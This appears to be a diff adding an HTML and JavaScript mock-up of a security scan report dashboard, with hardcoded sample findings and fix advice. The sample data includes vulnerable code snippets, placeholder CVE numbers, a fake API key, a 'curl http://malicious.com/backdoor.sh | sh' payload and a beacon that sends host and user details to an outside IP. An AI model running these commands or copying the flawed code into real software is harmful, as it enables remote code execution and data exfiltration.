@@ -1,0 +1,1359 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SecurityScan Hub - Detailed Report</title>
+<style>
+:root {
+  --bg: #0a0b14;
+  --bg-soft: #13151f;
+  --panel: #1a1d2e;
+  --ink: #e6e8f5;
+  --muted: #9ca3c9;
+  --border: #2a2d42;
+  --primary: #6366f1;
+  --success: #10b981;
+  --warning: #f59e0b;
+  --danger: #ef4444;
+  --info: #3b82f6;
+}
+
+* {
+  box-sizing: border-box;
+  margin: 0;
+  padding: 0;
+}
+
+body {
+  font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+  background: var(--bg);
+  color: var(--ink);
+  display: grid;
+  grid-template-columns: 260px 1fr;
+  min-height: 100vh;
+}
+
+.sidebar {
+  background: var(--panel);
+  border-right: 1px solid var(--border);
+  padding: 24px;
+  position: sticky;
+  top: 0;
+  height: 100vh;
+  overflow-y: auto;
+}
+
+.logo {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  margin-bottom: 32px;
+  padding-bottom: 20px;
+  border-bottom: 1px solid var(--border);
+}
+
+.logo-icon {
+  width: 36px;
+  height: 36px;
+  background: linear-gradient(135deg, var(--primary), #8b5cf6);
+  border-radius: 8px;
+  display: grid;
+  place-items: center;
+  font-size: 18px;
+}
+
+.logo-text {
+  font-size: 16px;
+  font-weight: 700;
+}
+
+.nav-section {
+  margin-bottom: 24px;
+}
+
+.nav-section h4 {
+  font-size: 11px;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+  color: var(--muted);
+  margin-bottom: 12px;
+  font-weight: 600;
+}
+
+.nav-item {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  padding: 10px 12px;
+  border-radius: 8px;
+  color: var(--muted);
+  text-decoration: none;
+  font-size: 14px;
+  transition: all 0.2s;
+  cursor: pointer;
+}
+
+.nav-item:hover,
+.nav-item.active {
+  background: var(--bg-soft);
+  color: var(--ink);
+}
+
+.tool-switcher {
+  background: var(--bg-soft);
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  padding: 12px;
+  margin-bottom: 20px;
+}
+
+.tool-switcher select {
+  width: 100%;
+  background: var(--panel);
+  border: 1px solid var(--border);
+  color: var(--ink);
+  padding: 10px;
+  border-radius: 6px;
+  font-size: 14px;
+  cursor: pointer;
+}
+
+.main-content {
+  padding: 32px;
+  overflow-y: auto;
+}
+
+.header {
+  margin-bottom: 32px;
+}
+
+.breadcrumb {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  font-size: 13px;
+  color: var(--muted);
+  margin-bottom: 16px;
+}
+
+.breadcrumb a {
+  color: var(--primary);
+  text-decoration: none;
+}
+
+.breadcrumb a:hover {
+  text-decoration: underline;
+}
+
+.title-section {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  margin-bottom: 16px;
+}
+
+.title-section h1 {
+  font-size: 32px;
+  display: flex;
+  align-items: center;
+  gap: 12px;
+}
+
+.tool-icon-large {
+  width: 48px;
+  height: 48px;
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 12px;
+  display: grid;
+  place-items: center;
+  font-size: 24px;
+}
+
+.action-bar {
+  display: flex;
+  gap: 8px;
+}
+
+.btn {
+  background: var(--panel);
+  border: 1px solid var(--border);
+  color: var(--ink);
+  padding: 10px 16px;
+  border-radius: 8px;
+  font-size: 14px;
+  font-weight: 600;
+  cursor: pointer;
+  transition: all 0.2s;
+  display: flex;
+  align-items: center;
+  gap: 6px;
+}
+
+.btn:hover {
+  border-color: var(--primary);
+  transform: translateY(-1px);
+}
+
+.btn-primary {
+  background: var(--primary);
+  border-color: var(--primary);
+}
+
+.btn-primary:hover {
+  background: #4f46e5;
+}
+
+.meta-info {
+  display: flex;
+  gap: 24px;
+  flex-wrap: wrap;
+  padding: 16px;
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 12px;
+  font-size: 14px;
+}
+
+.meta-item {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+
+.meta-item strong {
+  color: var(--muted);
+  font-weight: 500;
+}
+
+.summary-cards {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+  gap: 16px;
+  margin-bottom: 32px;
+}
+
+.summary-card {
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 12px;
+  padding: 24px;
+  transition: all 0.2s;
+}
+
+.summary-card:hover {
+  transform: translateY(-2px);
+  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
+}
+
+.summary-card.critical {
+  border-color: var(--danger);
+}
+
+.summary-card.high {
+  border-color: var(--warning);
+}
+
+.summary-card.medium {
+  border-color: #fbbf24;
+}
+
+.summary-card.low {
+  border-color: var(--info);
+}
+
+.summary-card .number {
+  font-size: 48px;
+  font-weight: 800;
+  margin-bottom: 8px;
+}
+
+.summary-card.critical .number {
+  color: var(--danger);
+}
+
+.summary-card.high .number {
+  color: var(--warning);
+}
+
+.summary-card.medium .number {
+  color: #fbbf24;
+}
+
+.summary-card.low .number {
+  color: var(--info);
+}
+
+.summary-card .label {
+  font-size: 14px;
+  color: var(--muted);
+  margin-bottom: 4px;
+}
+
+.summary-card .change {
+  font-size: 12px;
+  display: flex;
+  align-items: center;
+  gap: 4px;
+  margin-top: 8px;
+}
+
+.summary-card .change.up {
+  color: var(--danger);
+}
+
+.summary-card .change.down {
+  color: var(--success);
+}
+
+.section {
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 12px;
+  padding: 24px;
+  margin-bottom: 24px;
+}
+
+.section-header {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  margin-bottom: 20px;
+}
+
+.section-header h2 {
+  font-size: 20px;
+}
+
+.filters {
+  display: flex;
+  gap: 8px;
+  flex-wrap: wrap;
+  margin-bottom: 20px;
+}
+
+.filter-btn {
+  background: var(--bg-soft);
+  border: 1px solid var(--border);
+  color: var(--muted);
+  padding: 8px 14px;
+  border-radius: 6px;
+  font-size: 13px;
+  font-weight: 600;
+  cursor: pointer;
+  transition: all 0.2s;
+}
+
+.filter-btn:hover,
+.filter-btn.active {
+  border-color: var(--primary);
+  color: var(--ink);
+  background: var(--panel);
+}
+
+.search-box {
+  flex: 1;
+  min-width: 200px;
+  max-width: 300px;
+}
+
+.search-box input {
+  width: 100%;
+  background: var(--bg-soft);
+  border: 1px solid var(--border);
+  color: var(--ink);
+  padding: 8px 14px;
+  border-radius: 6px;
+  font-size: 13px;
+}
+
+.search-box input::placeholder {
+  color: var(--muted);
+}
+
+.vuln-list {
+  display: flex;
+  flex-direction: column;
+  gap: 12px;
+}
+
+.vuln-item {
+  background: var(--bg-soft);
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  padding: 20px;
+  transition: all 0.2s;
+  cursor: pointer;
+}
+
+.vuln-item:hover {
+  border-color: var(--primary);
+  transform: translateX(4px);
+}
+
+.vuln-item.expanded {
+  border-color: var(--primary);
+}
+
+.vuln-header {
+  display: flex;
+  align-items: start;
+  gap: 16px;
+}
+
+.severity-badge {
+  padding: 6px 12px;
+  border-radius: 6px;
+  font-size: 11px;
+  font-weight: 700;
+  text-transform: uppercase;
+  white-space: nowrap;
+}
+
+.severity-badge.critical {
+  background: rgba(239, 68, 68, 0.15);
+  color: var(--danger);
+  border: 1px solid var(--danger);
+}
+
+.severity-badge.high {
+  background: rgba(245, 158, 11, 0.15);
+  color: var(--warning);
+  border: 1px solid var(--warning);
+}
+
+.severity-badge.medium {
+  background: rgba(251, 191, 36, 0.15);
+  color: #fbbf24;
+  border: 1px solid #fbbf24;
+}
+
+.severity-badge.low {
+  background: rgba(59, 130, 246, 0.15);
+  color: var(--info);
+  border: 1px solid var(--info);
+}
+
+.vuln-content {
+  flex: 1;
+}
+
+.vuln-title {
+  font-size: 16px;
+  font-weight: 600;
+  margin-bottom: 8px;
+}
+
+.vuln-meta {
+  display: flex;
+  gap: 16px;
+  flex-wrap: wrap;
+  font-size: 13px;
+  color: var(--muted);
+  margin-bottom: 8px;
+}
+
+.vuln-meta span {
+  display: flex;
+  align-items: center;
+  gap: 4px;
+}
+
+.vuln-desc {
+  color: var(--muted);
+  font-size: 14px;
+  line-height: 1.6;
+  margin-bottom: 12px;
+}
+
+.vuln-tags {
+  display: flex;
+  gap: 6px;
+  flex-wrap: wrap;
+}
+
+.tag {
+  background: var(--panel);
+  border: 1px solid var(--border);
+  padding: 4px 10px;
+  border-radius: 12px;
+  font-size: 11px;
+  color: var(--muted);
+}
+
+.vuln-details {
+  display: none;
+  margin-top: 16px;
+  padding-top: 16px;
+  border-top: 1px solid var(--border);
+}
+
+.vuln-item.expanded .vuln-details {
+  display: block;
+}
+
+.detail-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+  gap: 16px;
+  margin-bottom: 16px;
+}
+
+.detail-item h4 {
+  font-size: 12px;
+  text-transform: uppercase;
+  color: var(--muted);
+  margin-bottom: 8px;
+}
+
+.detail-item p,
+.detail-item ul {
+  font-size: 14px;
+  line-height: 1.6;
+}
+
+.detail-item ul {
+  list-style-position: inside;
+  color: var(--muted);
+}
+
+.code-block {
+  background: var(--bg);
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  padding: 16px;
+  margin-top: 12px;
+  font-family: 'Courier New', monospace;
+  font-size: 13px;
+  overflow-x: auto;
+}
+
+.code-block .line {
+  display: block;
+  padding: 2px 0;
+}
+
+.code-block .highlight {
+  background: rgba(239, 68, 68, 0.1);
+  border-left: 3px solid var(--danger);
+  padding-left: 8px;
+  margin-left: -8px;
+}
+
+.recommendation {
+  background: rgba(16, 185, 129, 0.1);
+  border: 1px solid var(--success);
+  border-radius: 8px;
+  padding: 16px;
+  margin-top: 12px;
+}
+
+.recommendation h4 {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  font-size: 14px;
+  margin-bottom: 8px;
+  color: var(--success);
+}
+
+.recommendation p {
+  font-size: 14px;
+  line-height: 1.6;
+}
+
+.chart-container {
+  height: 300px;
+  margin-top: 20px;
+}
+
+@media (max-width: 1024px) {
+  body {
+    grid-template-columns: 1fr;
+  }
+  
+  .sidebar {
+    position: relative;
+    height: auto;
+    border-right: none;
+    border-bottom: 1px solid var(--border);
+  }
+}
+
+@media (max-width: 768px) {
+  .main-content {
+    padding: 16px;
+  }
+  
+  .title-section {
+    flex-direction: column;
+    align-items: start;
+    gap: 16px;
+  }
+  
+  .summary-cards {
+    grid-template-columns: repeat(2, 1fr);
+  }
+}
+</style>
+</head>
+<body>
+
+<aside class="sidebar">
+  <div class="logo">
+    <div class="logo-icon">🛡️</div>
+    <div class="logo-text">SecurityScan Hub</div>
+  </div>
+  
+  <div class="tool-switcher">
+    <select id="toolSelector" onchange="switchTool(this.value)">
+      <option value="opensca">🔍 OpenSCA</option>
+      <option value="modelscan">🧪 ModelScan</option>
+      <option value="sbom">📦 SBOM Generator</option>
+      <option value="codescan">💻 CodeScan</option>
+      <option value="lvjun">🛡️ LvJun Scan</option>
+    </select>
+  </div>
+  
+  <div class="nav-section">
+    <h4>Navigation</h4>
+    <a class="nav-item active" href="#overview">
+      <span>📊</span>
+      <span>Overview</span>
+    </a>
+    <a class="nav-item" href="#critical">
+      <span>🚨</span>
+      <span>Critical Issues</span>
+    </a>
+    <a class="nav-item" href="#high">
+      <span>⚠️</span>
+      <span>High Issues</span>
+    </a>
+    <a class="nav-item" href="#medium">
+      <span>📋</span>
+      <span>Medium Issues</span>
+    </a>
+    <a class="nav-item" href="#low">
+      <span>ℹ️</span>
+      <span>Low Issues</span>
+    </a>
+  </div>
+  
+  <div class="nav-section">
+    <h4>Actions</h4>
+    <a class="nav-item" href="#" onclick="exportReport()">
+      <span>💾</span>
+      <span>Export Report</span>
+    </a>
+    <a class="nav-item" href="#" onclick="shareReport()">
+      <span>📤</span>
+      <span>Share</span>
+    </a>
+    <a class="nav-item" href="scan-progress.html">
+      <span>←</span>
+      <span>Back to Scan</span>
+    </a>
+  </div>
+</aside>
+
+<main class="main-content">
+  <div class="header">
+    <div class="breadcrumb">
+      <a href="index.html">Home</a>
+      <span>/</span>
+      <a href="scan-progress.html">Scan Results</a>
+      <span>/</span>
+      <span id="currentTool">OpenSCA Report</span>
+    </div>
+    
+    <div class="title-section">
+      <h1>
+        <div class="tool-icon-large" id="toolIcon">🔍</div>
+        <span id="toolName">OpenSCA</span>
+      </h1>
+      <div class="action-bar">
+        <button class="btn" onclick="window.print()">
+          <span>🖨️</span>
+          <span>Print</span>
+        </button>
+        <button class="btn" onclick="exportReport()">
+          <span>💾</span>
+          <span>Export JSON</span>
+        </button>
+        <button class="btn btn-primary" onclick="createTicket()">
+          <span>🎫</span>
+          <span>Create Ticket</span>
+        </button>
+      </div>
+    </div>
+    
+    <div class="meta-info">
+      <div class="meta-item">
+        <strong>Repository:</strong>
+        <span>username/repository-name</span>
+      </div>
+      <div class="meta-item">
+        <strong>Scanned:</strong>
+        <span id="scanTime">2024-11-02 10:15:23 UTC</span>
+      </div>
+      <div class="meta-item">
+        <strong>Duration:</strong>
+        <span id="scanDuration">3.2s</span>
+      </div>
+      <div class="meta-item">
+        <strong>Branch:</strong>
+        <span>main</span>
+      </div>
+      <div class="meta-item">
+        <strong>Files Scanned:</strong>
+        <span id="filesScanned">247</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="summary-cards" id="summaryCards">
+    <!-- Summary cards will be inserted here -->
+  </div>
+
+  <div class="section">
+    <div class="section-header">
+      <h2>Vulnerability Distribution</h2>
+      <button class="btn" onclick="toggleChart()">
+        <span>📈</span>
+        <span>Toggle Chart</span>
+      </button>
+    </div>
+    <div class="chart-container" id="chartContainer">
+      <canvas id="vulnChart"></canvas>
+    </div>
+  </div>
+
+  <div class="section" id="vulnSection">
+    <div class="section-header">
+      <h2>All Vulnerabilities</h2>
+      <span class="meta-item" style="color: var(--muted); font-size: 14px;">
+        <span id="vulnCount">0</span> issues found
+      </span>
+    </div>
+    
+    <div class="filters">
+      <button class="filter-btn active" onclick="filterSeverity('all')">All</button>
+      <button class="filter-btn" onclick="filterSeverity('critical')">Critical</button>
+      <button class="filter-btn" onclick="filterSeverity('high')">High</button>
+      <button class="filter-btn" onclick="filterSeverity('medium')">Medium</button>
+      <button class="filter-btn" onclick="filterSeverity('low')">Low</button>
+      <div class="search-box">
+        <input type="text" placeholder="Search vulnerabilities..." onkeyup="searchVulns(this.value)">
+      </div>
+    </div>
+    
+    <div class="vuln-list" id="vulnList">
+      <!-- Vulnerabilities will be inserted here -->
+    </div>
+  </div>
+</main>
+
+<script>
+const TOOL_DATA = {
+  opensca: {
+    name: 'OpenSCA',
+    icon: '🔍',
+    desc: 'Software Composition Analysis',
+    summary: {
+      critical: 2,
+      high: 5,
+      medium: 12,
+      low: 8
+    },
+    vulns: [
+      {
+        id: 'OPENSCA-001',
+        severity: 'critical',
+        title: 'CVE-2024-1234: Prototype Pollution in lodash',
+        desc: 'A critical vulnerability allows attackers to modify object prototypes, leading to potential remote code execution.',
+        cve: 'CVE-2024-1234',
+        cvss: 9.8,
+        package: 'lodash',
+        version: '4.17.15',
+        fixedIn: '4.17.21',
+        category: 'Dependency',
+        cwe: 'CWE-1321',
+        references: ['https://nvd.nist.gov/vuln/detail/CVE-2024-1234'],
+        impact: 'Attackers can execute arbitrary code by exploiting prototype pollution in deeply nested object operations.',
+        solution: 'Upgrade lodash to version 4.17.21 or later. Review all usages of _.merge and _.set functions.',
+        code: `// Vulnerable code
+const _ = require('lodash');
+const user = {};
+_.merge(user, JSON.parse(userInput));`
+      },
+      {
+        id: 'OPENSCA-002',
+        severity: 'critical',
+        title: 'CVE-2023-9876: SQL Injection via ORM',
+        desc: 'Improper input sanitization in database queries allows SQL injection attacks.',
+        cve: 'CVE-2023-9876',
+        cvss: 9.1,
+        package: 'sequelize',
+        version: '5.21.0',
+        fixedIn: '6.25.0',
+        category: 'Dependency',
+        cwe: 'CWE-89',
+        references: ['https://nvd.nist.gov/vuln/detail/CVE-2023-9876'],
+        impact: 'Attackers can bypass authentication, extract sensitive data, or modify database contents.',
+        solution: 'Update to Sequelize 6.25.0+ and use parameterized queries. Audit all raw query usages.',
+        code: `// Vulnerable code
+User.findAll({
+  where: sequelize.literal(\`name = '\${userInput}'\`)
+});`
+      },
+      {
+        id: 'OPENSCA-003',
+        severity: 'high',
+        title: 'Outdated Express.js with Known Vulnerabilities',
+        desc: 'Using Express.js 4.16.0 which contains multiple security vulnerabilities.',
+        cvss: 7.5,
+        package: 'express',
+        version: '4.16.0',
+        fixedIn: '4.18.2',
+        category: 'Dependency',
+        cwe: 'CWE-1104',
+        references: ['https://expressjs.com/en/advanced/security-updates.html'],
+        impact: 'Vulnerable to DoS attacks and request smuggling.',
+        solution: 'Update Express to latest version 4.18.2 or higher.',
+        code: null
+      },
+      {
+        id: 'OPENSCA-004',
+        severity: 'high',
+        title: 'Insecure Deserialization in node-serialize',
+        desc: 'The node-serialize package allows arbitrary code execution through crafted payloads.',
+        cvss: 8.1,
+        package: 'node-serialize',
+        version: '0.0.4',
+        fixedIn: 'No fix available',
+        category: 'Dependency',
+        cwe: 'CWE-502',
+        references: ['https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/'],
+        impact: 'Remote code execution through deserialization of untrusted data.',
+        solution: 'Remove node-serialize dependency. Use JSON.parse for safe deserialization.',
+        code: `// Vulnerable code
+const serialize = require('node-serialize');
+const obj = serialize.unserialize(userInput);`
+      },
+      {
+        id: 'OPENSCA-005',
+        severity: 'medium',
+        title: 'Deprecated Package: request',
+        desc: 'The "request" package has been deprecated and is no longer maintained.',
+        package: 'request',
+        version: '2.88.2',
+        fixedIn: 'Use axios or node-fetch',
+        category: 'Dependency',
+        impact: 'No security updates will be provided for newly discovered vulnerabilities.',
+        solution: 'Migrate to actively maintained alternatives like axios or node-fetch.',
+        code: null
+      },
+      {
+        id: 'OPENSCA-006',
+        severity: 'medium',
+        title: 'Outdated cryptographic library',
+        desc: 'Using an old version of crypto-js with weak defaults.',
+        cvss: 5.3,
+        package: 'crypto-js',
+        version: '3.1.9',
+        fixedIn: '4.1.1',
+        category: 'Dependency',
+        cwe: 'CWE-327',
+        impact: 'Weak encryption may be compromised by modern computing power.',
+        solution: 'Update to crypto-js 4.1.1+ and review encryption implementations.',
+        code: null
+      }
+    ]
+  },
+  modelscan: {
+    name: 'ModelScan',
+    icon: '🧪',
+    desc: 'ML Model Security Scanner',
+    summary: {
+      critical: 1,
+      high: 2,
+      medium: 3,
+      low: 1
+    },
+    vulns: [
+      {
+        id: 'MODEL-001',
+        severity: 'critical',
+        title: 'Unsafe Pickle Deserialization in PyTorch Model',
+        desc: 'Model file contains arbitrary code that will execute during loading.',
+        package: 'model.pt',
+        category: 'Model Security',
+        cwe: 'CWE-502',
+        impact: 'Arbitrary code execution when model is loaded. Attacker can gain full system access.',
+        solution: 'Do not load this model. Retrain from trusted source or convert to SafeTensors format.',
+        code: `# Detected in model.pt
+posix.system('curl http://malicious.com/backdoor.sh | sh')
+subprocess.Popen(['python', 'malware.py'])`
+      },
+      {
+        id: 'MODEL-002',
+        severity: 'high',
+        title: 'Unverified Model Weights',
+        desc: 'Model lacks cryptographic signature verification.',
+        package: 'bert-base.bin',
+        category: 'Model Integrity',
+        impact: 'Cannot verify authenticity. Model may be tampered or poisoned.',
+        solution: 'Implement model signing and verification. Use trusted registries only.',
+        code: null
+      }
+    ]
+  },
+  sbom: {
+    name: 'SBOM Generator',
+    icon: '📦',
+    desc: 'Software Bill of Materials',
+    summary: {
+      critical: 0,
+      high: 3,
+      medium: 8,
+      low: 15
+    },
+    vulns: [
+      {
+        id: 'SBOM-001',
+        severity: 'high',
+        title: 'Missing License Information',
+        desc: '12 dependencies lack proper licensing information.',
+        category: 'Compliance',
+        impact: 'Potential legal and compliance issues.',
+        solution: 'Review and document all dependency licenses.',
+        code: null
+      }
+    ]
+  },
+  codescan: {
+    name: 'CodeScan',
+    icon: '💻',
+    desc: 'Static Code Analysis',
+    summary: {
+      critical: 3,
+      high: 8,
+      medium: 24,
+      low: 45
+    },
+    vulns: [
+      {
+        id: 'CODE-001',
+        severity: 'critical',
+        title: 'SQL Injection in User Controller',
+        desc: 'Direct string concatenation in SQL query allows injection attacks.',
+        file: 'src/controllers/user.js',
+        line: 47,
+        category: 'Injection',
+        cwe: 'CWE-89',
+        cvss: 9.8,
+        impact: 'Attackers can execute arbitrary SQL commands, potentially compromising the entire database.',
+        solution: 'Use parameterized queries or prepared statements. Never concatenate user input into SQL.',
+        code: `// Line 47 - VULNERABLE
+const query = "SELECT * FROM users WHERE username = '" + req.body.username + "'";
+db.query(query);
+
+// SECURE VERSION
+const query = "SELECT * FROM users WHERE username = ?";
+db.query(query, [req.body.username]);`
+      },
+      {
+        id: 'CODE-002',
+        severity: 'critical',
+        title: 'Hardcoded API Credentials',
+        desc: 'Production API key found in source code.',
+        file: 'src/config/api.js',
+        line: 12,
+        category: 'Sensitive Data',
+        cwe: 'CWE-798',
+        cvss: 9.1,
+        impact: 'Exposed credentials can be used to access production systems and data.',
+        solution: 'Move credentials to environment variables. Rotate the exposed key immediately.',
+        code: `// Line 12 - VULNERABLE
+const API_KEY = "sk_live_51H8pQxKZ9vR3mT0O4xYz";
+
+// SECURE VERSION
+const API_KEY = process.env.API_KEY;`
+      },
+      {
+        id: 'CODE-003',
+        severity: 'high',
+        title: 'Path Traversal Vulnerability',
+        desc: 'User input used directly in file path construction.',
+        file: 'src/routes/download.js',
+        line: 23,
+        category: 'Path Traversal',
+        cwe: 'CWE-22',
+        cvss: 7.5,
+        impact: 'Attackers can access arbitrary files on the server filesystem.',
+        solution: 'Validate and sanitize file paths. Use allowlist of permitted files.',
+        code: `// Line 23 - VULNERABLE
+const filePath = path.join(__dirname, 'uploads', req.query.file);
+res.sendFile(filePath);
+
+// SECURE VERSION
+const fileName = path.basename(req.query.file);
+const filePath = path.join(__dirname, 'uploads', fileName);
+if (!fs.existsSync(filePath)) {
+  return res.status(404).send('File not found');
+}`
+      }
+    ]
+  },
+  lvjun: {
+    name: 'LvJun Scan',
+    icon: '🛡️',
+    desc: 'Advanced Threat Detection',
+    summary: {
+      critical: 1,
+      high: 4,
+      medium: 9,
+      low: 12
+    },
+    vulns: [
+      {
+        id: 'LVJUN-001',
+        severity: 'critical',
+        title: 'Backdoor Pattern Detected',
+        desc: 'Suspicious network communication pattern found in codebase.',
+        file: 'src/utils/network.js',
+        line: 156,
+        category: 'Malicious Code',
+        impact: 'Potential data exfiltration or remote command execution capability.',
+        solution: 'Investigate the suspicious code. Remove if confirmed malicious.',
+        code: `// Line 156 - SUSPICIOUS
+setInterval(() => {
+  fetch('http://185.220.101.45:8080/beacon', {
+    method: 'POST',
+    body: JSON.stringify({
+      host: os.hostname(),
+      user: os.userInfo().username,
+      data: collectSystemInfo()
+    })
+  });
+}, 300000); // Every 5 minutes`
+      },
+      {
+        id: 'LVJUN-002',
+        severity: 'high',
+        title: 'Obfuscated Code Detected',
+        desc: 'Code obfuscation found which may hide malicious functionality.',
+        file: 'src/vendor/analytics.js',
+        line: 89,
+        category: 'Code Quality',
+        impact: 'Difficult to audit for security issues. May contain hidden threats.',
+        solution: 'Deobfuscate and review code. Remove if purpose is unclear.',
+        code: null
+      }
+    ]
+  }
+};
+
+let currentTool = 'opensca';
+let currentFilter = 'all';
+
+function initPage() {
+  const toolId = sessionStorage.getItem('selectedTool') || 'opensca';
+  currentTool = toolId;
+  loadTool(toolId);
+  document.getElementById('scanTime').textContent = new Date().toLocaleString();
+}
+
+function loadTool(toolId) {
+  const tool = TOOL_DATA[toolId];
+  if (!tool) return;
+  
+  currentTool = toolId;
+  document.getElementById('toolSelector').value = toolId;
+  document.getElementById('currentTool').textContent = tool.name + ' Report';
+  document.getElementById('toolName').textContent = tool.name;
+  document.getElementById('toolIcon').textContent = tool.icon;
+  
+  // Load summary cards
+  loadSummaryCards(tool.summary);
+  
+  // Load vulnerabilities
+  loadVulnerabilities(tool.vulns);
+  
+  // Draw chart
+  drawChart(tool.summary);
+}
+
+function loadSummaryCards(summary) {
+  const container = document.getElementById('summaryCards');
+  const total = summary.critical + summary.high + summary.medium + summary.low;
+  
+  container.innerHTML = `
+    <div class="summary-card">
+      <div class="label">Total Issues</div>
+      <div class="number">${total}</div>
+      <div class="change up">↑ 3 from last scan</div>
+    </div>
+    <div class="summary-card critical">
+      <div class="label">Critical</div>
+      <div class="number">${summary.critical}</div>
+      <div class="change up">↑ ${summary.critical} new</div>
+    </div>
+    <div class="summary-card high">
+      <div class="label">High</div>
+      <div class="number">${summary.high}</div>
+      <div class="change down">↓ 2 resolved</div>
+    </div>
+    <div class="summary-card medium">
+      <div class="label">Medium</div>
+      <div class="number">${summary.medium}</div>
+      <div class="change up">↑ ${Math.floor(summary.medium / 3)} new</div>
+    </div>
+    <div class="summary-card low">
+      <div class="label">Low</div>
+      <div class="number">${summary.low}</div>
+      <div class="change down">↓ 5 resolved</div>
+    </div>
+  `;
+}
+
+function loadVulnerabilities(vulns) {
+  const container = document.getElementById('vulnList');
+  document.getElementById('vulnCount').textContent = vulns.length;
+  
+  container.innerHTML = vulns.map(vuln => `
+    <div class="vuln-item" data-severity="${vuln.severity}" onclick="toggleVuln(this)">
+      <div class="vuln-header">
+        <span class="severity-badge ${vuln.severity}">${vuln.severity}</span>
+        <div class="vuln-content">
+          <div class="vuln-title">${vuln.title}</div>
+          <div class="vuln-meta">
+            ${vuln.cve ? `<span>🔖 ${vuln.cve}</span>` : ''}
+            ${vuln.cvss ? `<span>📊 CVSS: ${vuln.cvss}</span>` : ''}
+            ${vuln.file ? `<span>📄 ${vuln.file}${vuln.line ? ':' + vuln.line : ''}</span>` : ''}
+            ${vuln.package ? `<span>📦 ${vuln.package}</span>` : ''}
+            <span>🏷️ ${vuln.category}</span>
+          </div>
+          <div class="vuln-desc">${vuln.desc}</div>
+          <div class="vuln-tags">
+            ${vuln.cwe ? `<span class="tag">${vuln.cwe}</span>` : ''}
+            ${vuln.version ? `<span class="tag">Version: ${vuln.version}</span>` : ''}
+            ${vuln.fixedIn ? `<span class="tag">Fixed in: ${vuln.fixedIn}</span>` : ''}
+          </div>
+        </div>
+      </div>
+      <div class="vuln-details">
+        <div class="detail-grid">
+          <div class="detail-item">
+            <h4>Impact</h4>
+            <p>${vuln.impact}</p>
+          </div>
+          <div class="detail-item">
+            <h4>Solution</h4>
+            <p>${vuln.solution}</p>
+          </div>
+          ${vuln.references ? `
+          <div class="detail-item">
+            <h4>References</h4>
+            <ul>
+              ${vuln.references.map(ref => `<li><a href="${ref}" target="_blank">${ref}</a></li>`).join('')}
+            </ul>
+          </div>
+          ` : ''}
+        </div>
+        ${vuln.code ? `
+        <div class="code-block">
+          ${vuln.code.split('\n').map(line => 
+            `<span class="line ${line.includes('VULNERABLE') || line.includes('//') ? 'highlight' : ''}">${escapeHtml(line)}</span>`
+          ).join('')}
+        </div>
+        ` : ''}
+        <div class="recommendation">
+          <h4>
+            <span>✓</span>
+            <span>Recommended Action</span>
+          </h4>
+          <p>${vuln.solution}</p>
+        </div>
+      </div>
+    </div>
+  `).join('');
+}
+
+function drawChart(summary) {
+  const canvas = document.getElementById('vulnChart');
+  const ctx = canvas.getContext('2d');
+  
+  // Set canvas size
+  canvas.width = canvas.offsetWidth;
+  canvas.height = 300;
+  
+  const data = [
+    { label: 'Critical', value: summary.critical, color: '#ef4444' },
+    { label: 'High', value: summary.high, color: '#f59e0b' },
+    { label: 'Medium', value: summary.medium, color: '#fbbf24' },
+    { label: 'Low', value: summary.low, color: '#3b82f6' }
+  ];
+  
+  const total = data.reduce((sum, item) => sum + item.value, 0);
+  const barWidth = 60;
+  const gap = 40;
+  const startX = (canvas.width - (data.length * barWidth + (data.length - 1) * gap)) / 2;
+  const maxValue = Math.max(...data.map(d => d.value), 1);
+  const chartHeight = canvas.height - 80;
+  
+  // Clear canvas
+  ctx.clearRect(0, 0, canvas.width, canvas.height);
+  
+  // Draw bars
+  data.forEach((item, i) => {
+    const x = startX + i * (barWidth + gap);
+    const barHeight = (item.value / maxValue) * chartHeight;
+    const y = canvas.height - barHeight - 40;
+    
+    // Draw bar
+    ctx.fillStyle = item.color;
+    ctx.fillRect(x, y, barWidth, barHeight);
+    
+    // Draw value on top
+    ctx.fillStyle = '#e6e8f5';
+    ctx.font = 'bold 18px Inter';
+    ctx.textAlign = 'center';
+    ctx.fillText(item.value.toString(), x + barWidth / 2, y - 10);
+    
+    // Draw label
+    ctx.fillStyle = '#9ca3c9';
+    ctx.font = '14px Inter';
+    ctx.fillText(item.label, x + barWidth / 2, canvas.height - 15);
+    
+    // Draw percentage
+    const percentage = total > 0 ? Math.round((item.value / total) * 100) : 0;
+    ctx.font = '12px Inter';
+    ctx.fillText(percentage + '%', x + barWidth / 2, canvas.height - 2);
+  });
+}
+
+function toggleVuln(element) {
+  element.classList.toggle('expanded');
+}
+
+function switchTool(toolId) {
+  loadTool(toolId);
+  currentFilter = 'all';
+  document.querySelectorAll('.filter-btn').forEach(btn => {
+    btn.classList.remove('active');
+  });
+  document.querySelector('.filter-btn').classList.add('active');
+}
+
+function filterSeverity(severity) {
+  currentFilter = severity;
+  const items = document.querySelectorAll('.vuln-item');
+  
+  // Update active filter button
+  document.querySelectorAll('.filter-btn').forEach(btn => {
+    btn.classList.remove('active');
+  });
+  event.target.classList.add('active');
+  
+  items.forEach(item => {
+    if (severity === 'all' || item.dataset.severity === severity) {
+      item.style.display = 'block';
+    } else {
+      item.style.display = 'none';
+    }
+  });
+}
+
+function searchVulns(query) {
+  const items = document.querySelectorAll('.vuln-item');
